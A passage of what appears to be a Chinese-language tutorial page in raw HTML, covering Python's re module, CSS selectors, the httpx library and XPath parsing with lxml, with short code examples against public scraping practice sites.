class="token string">'MyToolsMyCompueter'</span>m<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'M'</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment">#['M','M']</span><span class="token comment">#finditer实例</span>it<span class="token operator">=</span>re<span class="token punctuation">.</span>finditer<span class="token punctuation">(</span><span class="token string">r"\d+"</span><span class="token punctuation">,</span><span class="token string">"12a32bc43jf3"</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token keyword">match</span> <span class="token keyword">in</span> it<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#12 32 43 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="分割函数"><a class="markdownIt-Anchor" href="#分割函数"></a> <strong>分割函数</strong></h4><blockquote><p>re.split(pattern, string, maxsplit=0, flags=0)</p><ul><li>pattern 分割string的正则匹配规则</li><li>maxsplit 最多分割次数</li><li>string 目标字符串</li><li>flags 匹配模式</li></ul></blockquote><p><strong>str.split与re.split的选择</strong>：str.split函数功能简单，不支持正则分割，而re.split支持正则。</p><p>1000次循环以内str.split函数更快，而循环次数1000次以上后re.split函数明显更快，而且次数越多差距越大！</p><p>在<strong>不需要正则支持且数据量和数次不多的情况下使用str.split函数更合适，反之则使用re.split函数</strong>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#split实例</span>s<span class="token operator">=</span><span class="token string">'abc,abc,defg,dds'</span>re<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'(\W+)'</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token comment">#匹配，分割</span><span class="token comment">#['abc', ',  ', 'abc', ',  ', 'defg', ',  ', 'dds']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="替换函数"><a class="markdownIt-Anchor" href="#替换函数"></a> <strong>替换函数</strong></h4><blockquote><p>re.sub(pattern, repl, string, count=0, flags=0)</p><ul><li>pattern 匹配表达式</li><li>repl 用于替换掉string被pattern匹配的字符</li><li>count 表示替换次数</li><li>flags 匹配规则</li></ul><p>re.subn:参数相同但是返回的一个元组(替换后的字符串,替换次数)</p></blockquote><p>值得注意的是：sub函数中的入参：repl替换内容既可以是字符串，也可以是一个函数哦！ 如果repl为函数时，只能有一个入参：Match匹配对象。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sub实例 target：将匹配到结果中小于4的替换成8，大于4的替换成9</span><span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">modify</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    matched<span class="token operator">=</span>value<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>matched<span class="token punctuation">)</span> <span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'8'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'9'</span><span class="token builtin">str</span><span class="token operator">=</span><span class="token string">'ab12cd34ef567'</span>result<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'\d'</span><span class="token punctuation">,</span>modify<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment">#ab88cd88ef999</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#subn实例</span><span class="token keyword">import</span> re<span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>subn<span class="token punctuation">(</span><span class="token string">'ov'</span><span class="token punctuation">,</span> <span class="token string">'~*'</span> <span class="token punctuation">,</span> <span class="token string">'movie tickets booking in online'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#('m~*ie tickets booking in online', 1)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>编译函数</strong></p><blockquote><p>compile函数</p><p>compile函数将正则表达式的样式编译为一个正则表达式对象（Pattern），且与re模块相同的函数。</p></blockquote><p><strong>用re模块还是正则对象Pattern的选择：</strong></p><p>官方文档推荐：在多次使用某个正则表达式时推荐使用正则对象Pattern 以增加复用性，因为通过 re.compile(pattern) 编译后的模块级函数会被缓存！</p><blockquote><p>re.escape(pattern) 可以转义正则表达式中具有特殊含义的字符，比如：. 或者 *</p><p>re.purge()不常用，清楚正则缓存</p></blockquote><h2 id="css-selector"><a class="markdownIt-Anchor" href="#css-selector"></a> css-selector</h2><h3 id="基本选择器"><a class="markdownIt-Anchor" href="#基本选择器"></a> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors#%E5%9F%BA%E6%9C%AC%E9%80%89%E6%8B%A9%E5%99%A8">基本选择器</a></h3><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Universal_selectors">通用选择器</a></p><p>​    选择所有元素。（可选）可以将其限制为特定的名称空间或所有名称空间。    <strong>语法：</strong><code>*</code> <code>ns|*</code> <code>*|*</code>    <strong>例子：</strong><code>*</code> 将匹配文档的所有元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Type_selectors">元素选择器</a></p><p>​    按照给定的节点名称，选择所有匹配的元素。    <strong>语法：</strong><code>elementname</code>    <strong>例子：</strong><code>input</code> 匹配任何 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input">``</a> 元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Class_selectors">类选择器</a></p><p>​    按照给定的 <code>class</code> 属性的值，选择所有匹配的元素。    <strong>语法：</strong><code>.classname</code>    <strong>例子：</strong><code>.index</code> 匹配任何 <code>class</code> 属性中含有 “index” 类的元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/ID_selectors">ID 选择器</a></p><p>​    按照 <code>id</code> 属性选择一个与之匹配的元素。需要注意的是，一个文档中，每个 ID 属性都应当是唯一的。    <strong>语法：</strong><code>#idname</code>    <strong>例子：</strong><code>#toc</code> 匹配 ID 为 “toc” 的元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors">属性选择器</a></p><p>​    按照给定的属性，选择所有匹配的元素。    <strong>语法：</strong><code>[attr]</code> <code>[attr=value]</code> <code>[attr~=value]</code> <code>[attr|=value]</code> <code>[attr^=value]</code> <code>[attr$=value]</code> <code>[attr*=value]</code>    <strong>例子：</strong><code>[autoplay]</code> 选择所有具有 <code>autoplay</code> 属性的元素（不论这个属性的值是什么）。</p></li></ul><h3 id="分组选择器grouping-selector"><a class="markdownIt-Anchor" href="#分组选择器grouping-selector"></a> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors#%E5%88%86%E7%BB%84%E9%80%89%E6%8B%A9%E5%99%A8%EF%BC%88grouping_selector%EF%BC%89">分组选择器（Grouping selector）</a></h3><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Selector_list">选择器列表</a></p><p>​    <code>,</code> 是将不同的选择器组合在一起的方法，它选择所有能被列表中的任意一个选择器选中的节点。    <strong>语法：</strong><code>A, B</code>    <strong>示例：</strong><code>div, span</code> 会同时匹配 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/div"><code>](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/span) 元素和 [</code></a> 元素。</p></li></ul><h3 id="组合器combinator"><a class="markdownIt-Anchor" href="#组合器combinator"></a> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors#%E7%BB%84%E5%90%88%E5%99%A8%EF%BC%88combinator%EF%BC%89">组合器（Combinator）</a></h3><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Descendant_combinator">后代组合器</a></p><p>​    “ ”（空格）组合器选择前一个元素的后代节点。    <strong>语法：</strong><code>A B</code>    <strong>例子：</strong><code>div span</code> 匹配所有位于任意 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/span"><code>](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/div) 元素之内的 [</code></a> 元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Child_combinator">直接子代组合器</a></p><p>​    <code>&gt;</code> 组合器选择前一个元素的直接子代的节点。    <strong>语法：</strong><code>A &gt; B</code>    <strong>例子：</strong><code>ul &gt; li</code> 匹配直接嵌套在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/li"><code>](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ul) 元素内的所有 [</code></a> 元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Subsequent-sibling_combinator">一般兄弟组合器</a></p><p>​    <code>~</code> 组合器选择兄弟元素，也就是说，后一个节点在前一个节点后面的任意位置，并且共享同一个父节点。    <strong>语法：</strong><code>A ~ B</code>    <strong>例子：</strong><code>p ~ span</code> 匹配同一父元素下，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/span"><code>](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/p) 元素后的所有 [</code></a> 元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Next-sibling_combinator">紧邻兄弟组合器</a></p><p>​    <code>+</code> 组合器选择相邻元素，即后一个元素紧跟在前一个之后，并且共享同一个父节点。    <strong>语法：</strong><code>A + B</code>    <strong>例子：</strong><code>h2 + p</code> 会匹配<em>紧</em>邻在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/Heading_Elements">h2</a> 元素后的第一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/p">``</a> 元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Column_combinator">列组合器</a>     实验性</p><p>​    <code>||</code> 组合器选择属于某个表格行的节点。    <strong>语法：</strong><code>A || B</code>    <strong>例子：</strong><code>col || td</code> 会匹配所有  作用域内的 ` (en-US)](<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/td">https://developer.mozilla.org/en-US/docs/Web/HTML/Element/td</a>) 元素。</p></li></ul><h3 id="伪选择器pseudo"><a class="markdownIt-Anchor" href="#伪选择器pseudo"></a> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors#%E4%BC%AA%E9%80%89%E6%8B%A9%E5%99%A8%EF%BC%88pseudo%EF%BC%89">伪选择器（Pseudo）</a></h3><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Pseudo-classes">伪类</a></p><p>​    <code>:</code> 伪选择器支持按照未被包含在文档树中的状态信息来选择元素。    <strong>例子：</strong><code>a:visited</code> 匹配所有曾被访问过的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/a">``</a> 元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Pseudo-elements">伪元素</a></p><h4 id="伪选择器用于表示无法用-html-语义表达的实体-例子pfirst-line-匹配所有-元素的第一行"><a class="markdownIt-Anchor" href="#伪选择器用于表示无法用-html-语义表达的实体-例子pfirst-line-匹配所有-元素的第一行"></a> <code>::</code> 伪选择器用于表示无法用 HTML 语义表达的实体。    <strong>例子：</strong><code>p::first-line</code> 匹配所有 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/p">``</a> 元素的第一行。</h4></li></ul><h2 id="httpx"><a class="markdownIt-Anchor" href="#httpx"></a> <strong>httpx</strong></h2><p>httpx针对于爬取http2.0协议的网站</p><p>httpx官方文档：<a href="https://www.python-httpx.org/quickstart">https://www.python-httpx.org/quickstart</a></p><blockquote><p>httpx 和 requests 的API 极其相似</p></blockquote><h3 id="基本用法"><a class="markdownIt-Anchor" href="#基本用法"></a> <strong>基本用法</strong></h3><ul><li>GET</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> httpx   response<span class="token operator">=</span>httpx<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://spa16.scrape.center'</span><span class="token punctuation">)</span>response<span class="token punctuation">.</span>status_code<span class="token comment">#状态码</span>response<span class="token punctuation">.</span>headers<span class="token comment">#响应头  返回一个Headers对象，类似于一个字典</span>response<span class="token punctuation">.</span>text <span class="token comment">#正文内容 </span><span class="token comment">#更换UserAgent</span>headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0'</span><span class="token punctuation">&#125;</span>response<span class="token operator">=</span>httpx<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>其他方法:httpx.get/post/put/delete/patch</p></li><li><p>Response对象的属性和方法</p><ul><li>status_code 状态码</li><li>text 响应体的文本内容</li><li>content 响应体的二进制内容</li><li>headers 响应头</li><li>json 方法，将文本结果转化为json对象</li></ul></li></ul><h3 id="client对象"><a class="markdownIt-Anchor" href="#client对象"></a> <strong>Client对象</strong></h3><blockquote><p>可以与requests中的Session对象类比学习</p><p>client的更多高级用法:<a href="https://www.python-httpx.org/advanced">https://www.python-httpx.org/advanced</a></p></blockquote><ul><li>使用方式:比较推荐的使用方式:with as</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> httpx<span class="token keyword">with</span> httpx<span class="token punctuation">.</span>client<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> client<span class="token punctuation">:</span>    response<span class="token operator">=</span>client<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.httpbin.org/get'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>等价于</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> httpxclient<span class="token operator">=</span>httpx<span class="token punctuation">.</span>Client<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    response<span class="token operator">=</span>clinet<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.httpbin.org/get'</span><span class="token punctuation">)</span><span class="token keyword">finally</span><span class="token punctuation">:</span>    client<span class="token punctuation">(</span>close<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>填入参数 header=?</p></li><li><p>新参数http_version 若http2=True 则支持http2  默认是关闭的不支持http2</p></li><li><p>支持异步客户端请求</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> httpx<span class="token keyword">import</span> asyncio <span class="token comment">#一个异步爬虫框架</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">async</span> <span class="token keyword">with</span> httpx<span class="token punctuation">.</span>AsyncClient<span class="token punctuation">(</span>http2<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token keyword">as</span> client<span class="token punctuation">:</span>        response<span class="token operator">=</span><span class="token keyword">await</span> client<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>run_until_complete<span class="token punctuation">(</span>fetch<span class="token punctuation">(</span><span class="token string">'https://www.httpbin.org/get'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="x-path"><a class="markdownIt-Anchor" href="#x-path"></a> X-Path</h2><p>XPath的全程是XML PATH Language 即xml路径语言，用于在xml文档中 查找信息，但是同样适用于HTML文档的搜索</p><h3 id="xpath语法"><a class="markdownIt-Anchor" href="#xpath语法"></a> Xpath语法</h3><h4 id="xml实例"><a class="markdownIt-Anchor" href="#xml实例"></a> xml实例</h4><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bookstore</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>eng<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Harry Potter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>29.99<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>eng<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Learning XML<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>39.95<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bookstore</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="术语"><a class="markdownIt-Anchor" href="#术语"></a> 术语</h4><p>在 XPath 中，有七种类型的<strong>节点</strong>：元素、属性、文本、命名空间、处理指令、注释以及文档（根）节点。XML 文档是被作为节点树来对待的。树的根被称为文档节点或者根节点。</p><p><strong>基本值</strong>是无父或无子的节点。</p><p><strong>项目</strong>是基本值或者节点</p><p>每个元素以及属性都有一个<strong>父</strong>。</p><p>元素节点可有零个、一个或多个<strong>子</strong>。</p><p><strong>同胞</strong>：拥有相同的父的节点</p><p><strong>先辈</strong>：某节点的父、父的父，等等</p><p><strong>后代</strong>:    某个节点的子，子的子</p><p><strong>轴</strong>:可定义相对于当前节点的节点集。</p><table><thead><tr><th>轴名称</th><th>结果</th></tr></thead><tbody><tr><td>ancestor</td><td>选取当前节点的所有先辈（父、祖父等）。</td></tr><tr><td>ancestor-or-self</td><td>选取当前节点的所有先辈（父、祖父等）以及当前节点本身。</td></tr><tr><td>attribute</td><td>选取当前节点的所有属性。</td></tr><tr><td>child</td><td>选取当前节点的所有子元素。</td></tr><tr><td>descendant</td><td>选取当前节点的所有后代元素（子、孙等）。</td></tr><tr><td>descendant-or-self</td><td>选取当前节点的所有后代元素（子、孙等）以及当前节点本身。</td></tr><tr><td>following</td><td>选取文档中当前节点的结束标签之后的所有节点。</td></tr><tr><td>following-sibling</td><td>选取当前节点之后的所有兄弟节点</td></tr><tr><td>namespace</td><td>选取当前节点的所有命名空间节点。</td></tr><tr><td>parent</td><td>选取当前节点的父节点。</td></tr><tr><td>preceding</td><td>选取文档中当前节点的开始标签之前的所有节点。</td></tr><tr><td>preceding-sibling</td><td>选取当前节点之前的所有同级节点。</td></tr><tr><td>self</td><td>选取当前节点。</td></tr></tbody></table><h4 id="选取节点"><a class="markdownIt-Anchor" href="#选取节点"></a> 选取节点</h4><table><thead><tr><th>表达式</th><th>描述</th></tr></thead><tbody><tr><td>nodename</td><td>读取此节点的所有子节点</td></tr><tr><td>/</td><td>从当前节点选取直接子节点</td></tr><tr><td>//</td><td>从当前节点选取子孙节点</td></tr><tr><td>.</td><td>选取当前节点</td></tr><tr><td>…</td><td>选取当前节点的父节点</td></tr><tr><td>@</td><td>选取属性</td></tr></tbody></table><p>eg://title[@lang=‘eng’] 表示 所有名称为title，同时属性lang的值为eng的节点</p><table><thead><tr><th>路径表达式</th><th>结果</th></tr></thead><tbody><tr><td>bookstore</td><td>选取 bookstore 元素的所有子节点。</td></tr><tr><td>/bookstore</td><td>选取根元素 bookstore。 注释：假如路径起始于正斜杠( / )，则此路径始终代表到某元素的绝对路径！</td></tr><tr><td>bookstore/book</td><td>选取属于 bookstore 的子元素的所有 book 元素。</td></tr><tr><td>//book</td><td>选取所有 book 子元素，而不管它们在文档中的位置。</td></tr><tr><td>bookstore//book</td><td>选择属于 bookstore 元素的后代的所有 book 元素，而不管它们位于 bookstore 之下的什么位置。</td></tr><tr><td>//@lang</td><td>选取名为 lang 的所有属性。</td></tr></tbody></table><h4 id="谓语predicates"><a class="markdownIt-Anchor" href="#谓语predicates"></a> 谓语（Predicates）</h4><p>谓语用来查找某个特定的节点或者包含某个指定的值的节点。</p><p>谓语被嵌在方括号中。</p><p>在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果：</p><table><thead><tr><th>路径表达式</th><th>结果</th></tr></thead><tbody><tr><td>/bookstore/book[1]</td><td>选取属于 bookstore 子元素的第一个 book 元素。</td></tr><tr><td>/bookstore/book[last()]</td><td>选取属于 bookstore 子元素的最后一个 book 元素。</td></tr><tr><td>/bookstore/book[last()-1]</td><td>选取属于 bookstore 子元素的倒数第二个 book 元素。</td></tr><tr><td>/bookstore/book[position()❤️]</td><td>选取最前面的两个属于 bookstore 元素的子元素的 book 元素。</td></tr><tr><td>//title[@lang]</td><td>选取所有拥有名为 lang 的属性的 title 元素。</td></tr><tr><td>//title[@lang=‘eng’]</td><td>选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。</td></tr><tr><td>/bookstore/book[price&gt;35.00]</td><td>选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。</td></tr><tr><td>/bookstore/book[price&gt;35.00]//title</td><td>选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。</td></tr></tbody></table><h4 id="选取未知节点"><a class="markdownIt-Anchor" href="#选取未知节点"></a> 选取未知节点</h4><p>XPath 通配符可用来选取未知的 XML 元素。</p><table><thead><tr><th>通配符</th><th>描述</th></tr></thead><tbody><tr><td>*</td><td>匹配任何元素节点。</td></tr><tr><td>@*</td><td>匹配任何属性节点。</td></tr><tr><td>node()</td><td>匹配任何类型的节点。</td></tr></tbody></table><p>在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：</p><table><thead><tr><th>路径表达式</th><th>结果</th></tr></thead><tbody><tr><td>/bookstore/*</td><td>选取 bookstore 元素的所有子元素。</td></tr><tr><td>//*</td><td>选取文档中的所有元素。</td></tr><tr><td>//title[@*]</td><td>选取所有带有属性的 title 元素。</td></tr></tbody></table><h4 id="选取若干路径"><a class="markdownIt-Anchor" href="#选取若干路径"></a> 选取若干路径</h4><p>通过在路径表达式中使用&quot;|&quot;运算符，您可以选取若干个路径。</p><p>在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：</p><table><thead><tr><th>路径表达式</th><th>结果</th></tr></thead><tbody><tr><td>//book/title | //book/price</td><td>选取 book 元素的所有 title 和 price 元素。</td></tr><tr><td>//title | //price</td><td>选取文档中的所有 title 和 price 元素。</td></tr><tr><td>/bookstore/book/title | //price</td><td>选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素。</td></tr></tbody></table><h4 id="运算符"><a class="markdownIt-Anchor" href="#运算符"></a> <strong>运算符</strong></h4><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th><th>返回值</th></tr></thead><tbody><tr><td>|</td><td>计算两个节点集</td><td>//book | //cd</td><td>返回所有拥有 book 和 cd 元素的节点集</td></tr><tr><td>+</td><td>加法</td><td>6 + 4</td><td>10</td></tr><tr><td>-</td><td>减法</td><td>6 - 4</td><td>2</td></tr><tr><td>*</td><td>乘法</td><td>6 * 4</td><td>24</td></tr><tr><td>div</td><td>除法</td><td>8 div 4</td><td>2</td></tr><tr><td>=</td><td>等于</td><td>price=9.80</td><td>如果 price 是 9.80，则返回 true。 如果 price 是 9.90，则返回 false。</td></tr><tr><td>!=</td><td>不等于</td><td>price!=9.80</td><td>如果 price 是 9.90，则返回 true。 如果 price 是 9.80，则返回 false。</td></tr><tr><td>&lt;</td><td>小于</td><td>price&lt;9.80</td><td>如果 price 是 9.00，则返回 true。 如果 price 是 9.90，则返回 false。</td></tr><tr><td>&lt;=</td><td>小于或等于</td><td>price&lt;=9.80</td><td>如果 price 是 9.00，则返回 true。 如果 price 是 9.90，则返回 false。</td></tr><tr><td>&gt;</td><td>大于</td><td>price&gt;9.80</td><td>如果 price 是 9.90，则返回 true。 如果 price 是 9.80，则返回 false。</td></tr><tr><td>&gt;=</td><td>大于或等于</td><td>price&gt;=9.80</td><td>如果 price 是 9.90，则返回 true。 如果 price 是 9.70，则返回 false。</td></tr><tr><td>or</td><td>或</td><td>price=9.80 or price=9.70</td><td>如果 price 是 9.80，则返回 true。 如果 price 是 9.50，则返回 false。</td></tr><tr><td>and</td><td>与</td><td>price&gt;9.00 and price&lt;9.90</td><td>如果 price 是 9.80，则返回 true。 如果 price 是 8.50，则返回 false。</td></tr><tr><td>mod</td><td>计算除法的余数</td><td>5 mod 2</td><td>1</td></tr></tbody></table><h3 id="lxml库"><a class="markdownIt-Anchor" href="#lxml库"></a> lxml库</h3><p>可以通过xml库，利用XPath对HTML进行解析</p><p>demo1：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree<span class="token keyword">import</span> requeststext <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://quotes.toscrape.com'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>texthtml <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token comment">#声明text是一段HTML文本，然后调用HTML类进行初始化，html就构成了一个XPath解析对象</span><span class="token comment">#另一种不声明对象的html解析方法</span>html<span class="token operator">=</span>etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>text<span class="token punctuation">,</span>etree<span class="token punctuation">.</span>HTMLParse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>results<span class="token operator">=</span>etree<span class="token punctuation">.</span>tostring<span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token comment">#调用tostring的方法，可以自动修正HTML文本，返回的是bytes类型</span><span class="token keyword">print</span><span class="token punctuation">(</span>results<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对results进行html的xpath解析实例</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">result1<span class="token operator">=</span>html<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*'</span><span class="token punctuation">)</span>rresult2<span class="token operator">=</span><span class="token keyword">print</span><span class="token punctuation">(</span>result1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一些xpath表达式的解析</p><blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span>a<span class="token punctuation">[</span>@href<span class="token operator">=</span><span class="token string">"link1.html"</span><span class="token punctuation">]</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>@ <span class="token keyword">class</span> <span class="token comment">#首先选中href属性为link4.html的a节点，然后获取其父节点，再获取父节点的class属性</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span>li<span class="token punctuation">[</span>@<span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"item-0"</span><span class="token punctuation">]</span><span class="token operator">/</span>text<span 